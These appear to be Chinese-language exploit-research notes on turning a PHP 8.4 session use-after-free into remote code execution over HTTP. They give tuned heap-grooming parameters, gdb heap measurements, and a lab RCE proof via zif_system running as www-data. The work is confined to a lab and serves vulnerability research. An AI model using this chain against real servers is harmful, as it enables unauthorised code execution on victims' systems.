# 不依赖 display_errors 的泄漏路径：研究进展

日期：2026-10-21
目标：PHP 8.4.26 + Apache 2.4.68 prefork + mod_php（amd64）
约束：攻击请求只用 HTTP；最终目标不做插桩。本文的 gdb 测量全部在
**校准 lab 172.16.1.112** 上完成，不接触 172.16.0.103。

状态：**机制已验证可行，差最后一步页级内存耗尽**。不再需要
`display_errors=On` / `max_input_vars` warning 输出来设置 `headers_sent`。

---

## 1. 原路径为什么依赖 display_errors

阶段 1/2 的 A 需要：

```text
PS(send_cookie)=1
+
php_session_reset_id() 失败（这样 send_cookie 不会被清零）
+
A 在 pre-RINIT OOM，PS(id) 悬空
```

原实现用 `max_input_vars` warning 输出把 `SG(headers_sent)` 置 1，
使 `php_session_send_cookie()` 返回 FAILURE。`php_error_docref` 受
`display_errors` 控制；Off 时 warning 只进日志，不产生输出，
`SG(headers_sent)` 仍为 0，reset_id 成功并把 `send_cookie` 清零。

---

## 2. 已验证不可行的替代

### 2.1 `Expect: 100-continue`

Apache 在 PHP 处理前确实返回了：

```text
HTTP/1.1 100 Continue
```

但 PHP 的 `SG(headers_sent)` 仍是 0。A 之后：

```text
ps_globals.id          = 0x7ffff5e6e000
ps_globals.send_cookie = false
```

说明 100-continue 是 Apache 层，不会设置 PHP SAPI 的 headers_sent。
此路排除。

### 2.2 让 `sapi_header_op` 因非法 header 失败

`php_session_send_cookie()` 的 `Set-Cookie` 值来自 `php_url_encode(PS(id))`，
CR/LF/NUL 都会被 `%XX` 编码；session_name 来自 INI，攻击者不可控。
`sapi_header_op` 在非 headers_sent 情况下只会在 header 含 CR/LF/NUL 时
失败，构造不出来。此路排除。

### 2.3 远程改 display_errors / error_log

`display_errors`、`error_log` 都是 PHP_INI_ALL/PERDIR，但攻击者没有
目标侧代码执行或 `.htaccess` 写权限；`PHP_VALUE` 只对 CGI/FastCGI 的
配置通道有效，mod_php 下不能从请求头注入。此路排除。

---

## 3. 可行机制：让 OOM 发生在 `php_session_reset_id()` 内部

`ext/session/session.c` 的顺序：

```c
/* php_session_initialize() */
if (!PS(id) || !ZSTR_VAL(PS(id))[0]) {
    ...
    PS(id) = create_sid();
    if (PS(use_cookies)) {
        PS(send_cookie) = 1;          /* <-- 先置 1 */
    }
}
if (php_session_reset_id() == FAILURE) { ... }
```

`php_session_reset_id()`：

```c
if (PS(use_cookies) && PS(send_cookie)) {
    cookies_sent = php_session_send_cookie();
    if (cookies_sent == FAILURE) return FAILURE;
    PS(send_cookie) = 0;              /* <-- 只有成功发送才清零 */
}
```

`php_session_send_cookie()` 内部要分配：

- `smart_str` 的 Set-Cookie 头（~64B 级）
- `php_url_encode(PS(id), 32)` → `zend_string_safe_alloc(3, 32)`：
  `24 + 96 + 1 = 121` → **128B bin**

如果这些分配在 `zend_mm` 里失败，`zend_bailout` 直接跳到请求
shutdown，`PS(send_cookie)` 保持 1；A 的 big field 继续把请求 OOM 在
pre-RINIT，`PS(id)` 悬空。整个过程不需要任何 warning 输出。

---

## 4. Lab 验证（172.16.1.112，display_errors=Off）

### 4.1 A 形状

`tools/send_a_oomreset.py` / `send_a_bin128.py` / `send_a_longfile.py`：

```text
PHPSESSID = "\x00"
PHP_SESSION_UPLOAD_PROGRESS = "pwn"
997 个已注册 padding 字段（值大小可控）
file 字段（filename 长度可控）
```

没有 12MB big field；OOM 由 padding/文件头在 pre-RINIT 触发。

### 4.2 关键测量

在 `php_session_reset_id` 入口用 gdb 读 Zend MM：

```text
V=3000, 997 fields, N128=128:
RESET send=1 size=5878488 real=6291456 limit=8388608 rem=2097152 slot11=(nil) mainfree=0 chunks=3
RESET send=0 ...
```

- `size` 已达到 ~5.9M，但 `real_size` 只有 3 个 chunk = 6M，
  `rem = limit - real_size = 2MB` 正好还能拿一个新 chunk；
- 128B bin（`free_slot[11]`）为空；
- cookie 的 128B 页分配仍然成功（从现有 chunk 的空闲页或新 chunk）。

V=3200 时，padding 字段的 `php_sapi_filter → zend_string_init(3200)`
就在 **FILE_START 之前** OOM：

```text
MM_SAFE_ERROR limit=8388608 size=8256744
#4 zend_string_alloc(len=3200)
#6 php_sapi_filter
#7 rfc1867_post_handler
```

说明 Zend MM 的失败点是“需要新 4KB 页但没有新 2MB chunk”：

```text
ZEND_MM_CHUNK_SIZE (2MB) > limit - real_size  -> 拒绝新 chunk
```

### 4.3 当前差的一步

用长 filename（file part 的 `filename`，非 interned、计入内存）把
`real_size` 推到 limit：

```text
F=688128:
RESET send=1 size=7954856 real=8388608 limit=8388608 rem=0 slot11=(nil)
CHUNK 0 free_pages=0
CHUNK 1 free_pages=0
CHUNK 2 free_pages=68
CHUNK 3 free_pages=4
```

- `rem=0`：不会再拿新 chunk；
- 128B bin 为空：cookie 需要新页；
- 但 4 个 chunk 里**还剩 72 个空闲页**，cookie 的 128B 页从
  chunk 2/3 的空闲页成功分配 → `send_cookie` 被清零；A 后面的
  分配才 OOM（id 悬空但 send_cookie=false）。

按 4KB 细扫 F：

```text
F=688128  RESET send=1 real=8M rem=0 slot11=NULL  free_pages=0,0,68,4   (72)
F=692224  RESET send=1 real=8M rem=0 slot11=NULL  free_pages=0,0,68,1   (69)
F=696320  NO_RESET (在 FILE_START 之前就 OOM)
```

也就是说 filename 单体最多只能把空闲页压到 69；再增加 4KB 就会在
filename/header 分配阶段先 OOM，剩余 69 页始终留给 cookie。

**目标状态**：第一次 `php_session_reset_id` 时

```text
real_size == limit
rem == 0
free_slot[11] == NULL
所有 chunk free_pages == 0
```

这样 cookie 的 128B 页分配失败，`send_cookie` 残留 1。

---

## 4.4 已打通：display_errors=Off 下的 A 原语

最终可用的 A（校准 lab，display_errors=Off）：

```text
python3 send_a_idmain.py 129 3000 570 3040 20 1
  参数: N128=129, V=3000, NH=570, HL=3040, NS=20, N64E=1
```

A 之后：

```text
ps_globals.id          = 0x7ffff5e6e080   (main chunk, page 0x6e)
ps_globals.send_cookie = true
```

关键点：

1. **997 个 padding 字段**把堆推到 `real_size = limit = 8M`；
2. **NH=570 个 3040 字节未知 header** 把 chunk 空闲页压到 0；
3. **N128=129 个 103 字节值**清空 128B bin（cookie 的 `url_encode` 分配）；
4. **NS=20 个 15 字节 header** 清空 40B bin（cookie 的第一个
   `"Set-Cookie: "` smart_str 分配）；
5. `php_session_send_cookie` 进入时：
   `slot4 != NULL, slot11 == NULL, sum(free_pages) == 0`；
   40B 分配用现有槽，128B 分配无页可用 → OOM；
6. `send_cookie` 保持 1，`PS(id)` 悬空，child 存活；
7. **N64E=1 个 39 字节普通字段放在 padding 开头**，让 64B bin 在
   main chunk 提前分配一页；后面的 id 复用了这一页，落在
   `chunk+0x6e080`，而不是被 shutdown 释放的非 main chunk。

实测 post-A：

```text
NS=12/20/27:
$1 = 0x7ffff3dff000  $2 = true     # 早期版本 (id 在 chunk3)
N128=129, N64E=1:
$1 = 0x7ffff5e6e080  $2 = true     # id 在 main chunk
```

这就是**完全不依赖 display_errors** 的 `send_cookie=1 + 悬空 PS(id)`。

---

## 5.1 B 泄漏的当前校准状态

B 需要把 `0x7ffff5e6e080`（64B 对齐，页 0x6e，页内 0x80）重占成
fake zend_string。当前进展：

- A 的 id 页 `0x6e000` 在 B cleanup 时被 **16B bin** 重分
  （`map[0x6e]=0x80000001`），id 块变成 16B free-list 链；
- B 的 forge raw 实测地址（`php_sapi_filter`，val_len 分支）：
  - 32B forge：`0x7ffff5e011a0`（页 0x1）
  - 64B forge：B 的 64B bin 也没有认领 0x6e；
- 原因：Zend MM 的 bin 页分配优先取低地址空闲页；A 的 id 页 0x6e
  是 A 堆接近满时才拿到的页，B 的 32B/64B bin 首先拿低页
  （0x1、0x2…），16B/8B 的临时字符串又先认领了 0x6e。
- 已修正 B 的 multipart 构造 bug：header 与 body 之间必须有
  `\r\n\r\n`，否则 forge/PHPSESSID/progress 的值长度全为 0。

下一步（按优先级）：

1. **页转向**：在 B 的 forge part 之前放一个大字段（或一组中等字段），
   消耗低地址空闲页，使 32B/64B bin 的下一个页落到 0x6e；然后按
   slot 数放置 4 个 32B live header（slot0–3）和 32B forge raw
   （slot4=id）。
2. **移动 A id 页**：改变 N64E（early 39B 字段数）或 padding 顺序，
   让 id 页落到 B 的 32B/64B bin 实际使用的低页；id 必须在 main chunk，
   否则 shutdown 会释放该 chunk。
3. **16B 几何**：id 页已被 16B bin 重分；如果要走 16B，需要让两个
   16B slot 在 cleanup 时仍是 live 且内容可控（当前 raw/param 都会
   被 free-list next 覆盖），难度更高。

### 5.2 64B 几何：离命中只差一页

修好 multipart 空行后，64B B 的 forge raw 实测：

```text
b_forge64_first (2 个 39B header + forge 63B, forge part 最前):
  FORGE raw = 0x7ffff5e6f000   (page 0x6f, slot0)

b_forge64_pre (2 个 39B 普通字段 + forge 63B):
  FORGE raw = 0x7ffff5e6f100   (page 0x6f, slot4)
```

A 的 id：

```text
0x7ffff5e6e080   (page 0x6e, slot2)
```

也就是说 64B bin 的新页稳定落在 **0x6f**，A 的 id 页 0x6e 被
16B/32B 的临时字符串先认领（B cleanup 时 `map[0x6e]` 曾是
`0x80000001`）。两者只差一页。

尝试把 A id 移到 0x6f：把早期 39B 字段数加到 N64E=64
（N128=192），填满 0x6e 的 64 个 64B 槽。NH 重调结果：

```text
NH=632  RESET send=1 free=31 SEND0=1  POST id=0 send=false
NH=660  RESET send=1 free=3  SEND0=0  POST id=0 send=false
NH=670  NO_RESET
```

reset 能到、cookie 也可能失败，但 A 的 child 在 shutdown 后被换掉，
`PS(id)/send_cookie` 丢失。要完成 64B 对齐，需要：

1. 在 N64E=64 附近让 A 的 child 存活（换 NH/NS/N128，或把早期
   64B 字段放到不同位置），使 id 落在 0x6f000/0x6f100 且
   post-A `send_cookie=true`；或
2. 让 B 的 64B bin 先于 16B/32B 认领 page 0x6e（在请求启动/前几个
   part 之前就强制 64B 页分配，避免 16B/32B 抢页）。

### 5.3 最新对齐实验（仍未命中）

- **B 页固定 0x6f**：无论 forge part 顺序、pre 字段、HTTP `X-A/X-B`
  39B header、Host 39 字符、boundary 17S，64B forge raw 都是
  `0x7ffff5e6f000`（forge part 最前）或 `0x7ffff5e6f100`（两个 pre）。
  request startup 的 server var/bin 页竞争让 0x6e 先被 16B/32B 占走，
  64B bin 拿 0x6f。
- **A 侧移 id**：
  - `N64H=62` 个 39B header，NH=565：child 存活，但 id 仍是
    `0x6e080`（header 没有消费这个 head 槽）；
  - `N64H=63..70`：id 仍 `0x6e080`；
  - `N64H=80`：id 跳到 `0x7ffff5dfef40`（非目标页），send=false；
  - 末尾 K 个 39B live + 1 个 63B raw 字段（LIFO 让 id 拿 raw 槽）：
    K=1..16 在 NH=570+K 下 child 都不保留 id；
  - `N64E=64` 填满 0x6e 的 64 个 64B 槽，NH=632..660 时 reset 能到、
    cookie 可能失败，但 A child 在 shutdown 后被换掉，post id=0。

结论：A 原语稳定，B 的 64B forge 只差一页；但要让 A 的 id 落到
0x6f000/0x6f100，同时 child 存活，或者让 B 的 64B bin 抢到 0x6e，
还需要继续调 heap/page 顺序。

一旦 B 的 forge raw 落到 `0x7ffff5e6e080`，`Set-Cookie` 会变成
`len=0x1000` 的越界读，后面的 B 解码/chunk base 流程与原
display_errors 路径完全相同。

---

## 5. 剩余页的消耗策略

72 个空闲页（288KB）需要在 **filename 之后、reset 之前** 消耗掉，
但不能有超过空闲页的瞬时峰值。已验证的限制：

- 字段名是 interned（`php_register_variable_quick` →
  `zend_string_init_interned`），**不计入 memory_limit**；加长字段名无效。
- 单个超大 padding 字段（>3072）在 filter 里 raw buffer + value string
  同时存在，峰值 ~2×，会提前 OOM。
- 长 filename 也有 header line + filename 两份，峰值 ~2×；F=688K 时
  留 72 页，F≥720K 就提前 OOM。

可行方向（按优先级）：

1. **顺序多个中等分配，瞬时 buffer 在两次分配之间释放**
   - 例如 file part 的多个长 header 值（filename、Content-Type）或
     多个中等 value 字段；
   - 每个分配峰值 2×，但前一个的 raw/line buffer 释放后再做下一个；
   - 净 live 增长可逐步吃掉 72 页，同时峰值不超过剩余页。
2. **把剩余页消耗放在 FILE_START 内的 filename 之后**
   - filename 本身已是 reset 前最后一个大 live 字符串；
   - 如果能再加一个同属 FILE_START 前、但分配在 filename 之后的
     长字符串（如 Content-Type），就能在不增加峰值的情况下多消耗页。
3. **用多个小 bin 的 live 值/页分配填满剩余页**
   - 剩余 69 页在 chunk 2/3 的 free_pages 里，是**页级空闲页**；
     filename 的大分配没有使用它们（free_pages 不变）。
   - 需要让 reset 之前的 **bin slow path** 多次分配新页，逐个吃掉
     这 69 页；例如把 997 个 padding 字段的 value 大小分布到多个 bin，
     使每个 bin 的当前页恰好填满、下一字段触发新页。
   - 每次新 bin 页消耗 1 个 free_page；目标是第一次 reset 时
     `sum(free_pages)==0`，然后 cookie 的 128B 新页分配失败。
   - 单个字段峰值 2× 仍然限制总 live；用多个中等字段、让 raw buffer
     在字段之间释放，可以逐步推进。

每次调参后在校准 lab 用 `tools/chunks2.gdb` 看第一次 reset 的
`real/rem/slot11/各 chunk free_pages`；命中后 A 之后应看到：

```text
ps_globals.id          != 0
ps_globals.send_cookie == true
```

然后 B 仍然用原来的 80B/64B forge B，只需要按新的 A 重新校准 id 块地址
（B 的 K/offset）；泄漏不再依赖 display_errors。

---

## 6. 文件

| 文件 | 用途 |
|---|---|
| `tools/send_a_oomreset.py` | 基础 OOM-reset A（N 个 V 字节字段 + file） |
| `tools/send_a_bin128.py` | 用 103B 值填满 128B bin（cookie 的 e_id 同 bin） |
| `tools/send_a_longfile.py` | 用长 filename（非 interned）消耗 chunk 空闲页 |
| `tools/mem2.gdb` | reset 入口打印 size/real/limit/rem/slot11 |
| `tools/chunks2.gdb` | 打印所有 chunk 的 free_pages |
| `tools/oomsite2.gdb` | 抓 `zend_mm_safe_error` 的调用点和 backtrace |

---

## 7. 结论

- 原路径的 `display_errors` 依赖来自 warning 输出设置 `headers_sent`；
- `100-continue`、非法 header、远程改 INI 均不可行；
- **OOM 发生在 `php_session_reset_id()` 内部** 是可行的替代：已在校准
  lab 的 `display_errors=Off` 下把 heap 推到 `real=limit、rem=0、
  128B bin 空`，只差把最后 72 个 chunk 空闲页耗尽；
- **A 侧已打通**：`send_a_idmain.py 129 3000 570 3040 20 1` 在
  display_errors=Off 下留下 `send_cookie=1`、id 在 main chunk
  (`chunk+0x6e080`) 的悬空 PS(id)；
- 剩余工作只是 B 的 fake zend_string 落点校准（页转向/slot 对齐），
  不是新的原语。

---

## 8. RCE 验证与 display_errors 依赖的最终状态（2026-10-21 20:16）

### 8.1 参考 lab 上的 RCE 证明

在 `172.16.0.103`（ASLR-on、单 worker prefork）上用
`tools/pure_aslr_run.sh` 原链跑通：

```text
W1=925534  chunk=0x7f2517800000  attempt=1
W2=925632  libphp=0x7f2516000000 attempt=1
W3=925730  HTDATA=0x7f251786e0d8 ZIF=0x7f251643a870 attempt=1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

即：两次 `Set-Cookie` 泄漏（chunk、libphp）+ `zif_system`
（`libphp+0x43a870`）端到端 RCE，攻击请求全部是 HTTP。

### 8.2 这条链的 display_errors 依赖

`send_a_leak2/leak3` 的 A 依赖 `max_input_vars` warning 输出把
`SG(headers_sent)` 置 1，使 `php_session_reset_id()` 在
`php_session_send_cookie()` 之前失败，从而留下 `send_cookie=1` 的悬空
`PS(id)`。当 `display_errors=0` 时 warning 不输出，`headers_sent` 不置位，
A 的 reset 正常发 cookie 并清 `send_cookie`，B 的 END cleanup 没有泄漏。

实测：`.103` 当前默认 `display_errors 0` 时直接跑同一驱动：

```text
W1=924738 chunk=0x0 attempt=1
W1=924835 chunk=0x0 attempt=2
W1=924933 chunk=0x0 attempt=3
HEAP_LEAK_FAILED
```

为了验证 RCE 本体，本次临时把 `.103` 的
`/etc/apache2/conf-enabled/php8426.conf` 中 `display_errors`
由 `0` 改为 `1`，跑完后已恢复为 `0` 并 `apache2ctl -k restart`；
当前 `curl 127.0.0.1:8088/index.php` 返回 `OK`。

### 8.3 display_errors=Off 路径的现状

A 侧（无 warning、无输出）已在校准 lab 打通：

```text
A: tools/send_a_plain.py 129 3000 570 3040 20 1
RESET send=1 real=8388608 limit=8388608 rem=0 slot11=NULL
B cleanup: PS(id)=0x7ffff5e6e080 send=1, page 0x6e
```

B 侧仍未命中。A 的 id 实际是 32 字符随机 session id（64B
zend_string，位于 64B 页 0x6e 的 slot2）；B 的 64B forge raw 稳定落在
页 0x6f（`0x7ffff5e6f000`/`…f100`），而页 0x6e 在 B 的 request startup
被 16B/32B 临时字符串先占（cleanup 时 `map[0x6e]=0x80000001`）。
32B 变体（forge raw 页 0x1 slot13）和 8 字符 PHPSESSID 变体
（id 变成 32B，但落在 chunk1 的 0x…1d7 页）也做过，均未与 A 的 id
页/slot 对齐。

下一步仍是同一个对齐问题：
- 让 A 的 64B id 页变成 B 的 64B 页（0x6e vs 0x6f），或
- 让 B 的 64B bin 在 16B bin 之前拿到页 0x6e（HTTP 39B 头填充当前页
  未能改变 raw 页），或
- 用 8 字符 id 把 id 放进 B 的 32B 页 0x1 slot13（需要 A 的 32B
  页/槽校准）。

在此之前，`display_errors=0` 的纯 HTTP 链尚未到 RCE；已证明的 RCE
是参考配置（`display_errors=On`）下的完整链。

---

## 9. 纯 HTTP B 的最新定位（2026-10-21 20:30）

### 9.1 抢 0x6e 页的调用点

在 `.112` 上用 `tools/slowbins.gdb`（break `zend_mm_alloc_small_slow`）
抓到 B 的 16B slow path：

```text
SLOW bin=1 map6e=0x0
#1 _estrdup (s="Y-000")
#2 multipart_buffer_headers ... main/rfc1867.c:413
```

即：B 里第一个未知 multipart header 的**名字**（如 `Y-000`，6B）
先触发 16B bin 的 slow path，把 A 留下的 0x6e 页从 64B/24B 抢成 16B。

### 9.2 24B slot 伪造尝试

A 的 id 指针 `0x…6e080`，在 B 的 24B 页里 `ZSTR_LEN` 位于
`0x…6e090`（slot6）。曾尝试用“最后一个 part 的未知 header 值”
（23B → 24B smart_string，END cleanup 时仍然存活）在 slot6 写
`len=0x1000`：

- `tools/b_24hdr.py`、`b_24cookie.py`、`b_24hold.py`（含 200 个
  15B dummy header 试图占住 24B 页）；
- 结果 cleanup 时页 0x6e 仍是 `map=0x80000001`（16B），
  `0x6e090 = 0x…6e080`（16B free-list next），B 的响应为空
  （`php_url_encode` 读到巨大 len → OOM/bailout）。

根因：multipart header 是 C 字符串。`len=0x1000` 的小端首字节
`0x00` 会被 `smart_string_appends`/`strlen` 截断；而 24B 分配要求
value 长度 17–23，前 8 字节不可能既非 0 又拼出小整数。用 body 值
raw buffer 可以二进制安全，但它在注册后立即 free，首 8 字节被
free-list next 覆盖；24B 伪造路径基本被堵死。

### 9.3 A id 页扫描

```text
N64E=1   id=0x…6e080   (main chunk)
N64E=65  id=0x…83080   (64B 页 0x83)
N64E=66  id=0x…83100
N64E=67  id=0x…83180
N64E=64/N128=192/NH=580  id=0x…5dab000 (chunk1)
N64E=64/N128=129/NH=570  id=0x…3dfe000 (chunk1)
```

B 的 64B 页始终是 0x6f（`b_forge64_first` raw=0x…6f000），
A 的 64B 页是 0x6e/0x83/chunk1；两者没有稳定交集。

### 9.4 结论

- 1day RCE 本体已在 `display_errors=On` 参考配置下端到端证明（第 8 节）；
- `display_errors=Off` 的 A 原语成立，B 泄漏仍卡在 Zend MM 页分配：
  A 的 id 页（64B）与 B 能拿到的 64B/32B/24B 页不重合，且 24B
  C-string 伪造受 NUL 限制；
- 下一步要么找一个新的 A 形状把 id 精确放到 B 的 64B 首页 0x6f，
  要么换泄漏原语（例如让 B 真拿到 A 的 24B/64B 页并保持存活）。

---

## 10. 8B free-list 与长 header 名两次新尝试（2026-10-21 20:50）

### 10.1 8B free-list 思路

如果 A 的 id 页 0x6e 在 B 里被 8B bin 拿走，可以用 8B slot 伪造
`ZSTR_LEN`：一个 7 字节 body 值 raw 在 8B bin 里 free 时，若 bin 的
free list 为空，slot 的首 qword 写成 0；随后同一 slot 被 1 字符
header 名 `A`（`estrdup` 2B，8B bin）复用，写入 `A\0`，旧 qword 0
使 `ZSTR_LEN = 0x41`，从 `0x6e098` 读 65 字节，足以带上相邻
free-list 堆指针。

`tools/b_8tail.py` 按这个形状构造（16 个短名 header + 7 字节 body
+ progress part 的 6 个 `A: B`），但 cleanup 时：

```text
CLEANUP id=0x7ffff5e6e080 send=1
page=0x6e map=0x80000001       # 仍是 16B
0x6e090: 0x7ffff5e6e080        # 16B free-list next
```

16B bin（`form-data`/server var 等）仍然在 8B 之前拿走 0x6e。

### 10.2 长 header 名 A

尝试把 A 的 570 个 header 名从 10 字符改成 16 字符（`_estrdup`
17B → 24B bin），避免 A 的 16B bin 被 570 个名字填满、进而让 B 的
16B 首个分配触发 slow path 抢 0x6e：

```text
A: send_a_longhdr.py 129 3000 570 3040 20 1
结果：reset 断点未命中（A 在 header 阶段就 OOM，id 未生成）
B: b_forge64_first raw=0x7ffff5e6f000（仍是 0x6f 页）
```

长名增加的 ~7KB 把 A 的 OOM 提前到了 reset 之前；需要重新调 NH
才能同时保持 reset OOM 和 16B bin 状态，但 B 的 raw 页仍是 0x6f。

### 10.3 汇总

0x6e 页在 B 里的归属顺序实测为：

```text
16B (_estrdup/form-data)  >  24B  >  8B  >  64B
```

A 的 id 页（64B）总是被更小的 bin 先拿走；A 侧改 header 名长度
会让 OOM 提前。暖机历史、8B free-list、24B header 值、长 header 名
四条都已试过，仍没有把 B 的 fake 写到 A id 的 `len` 字段。
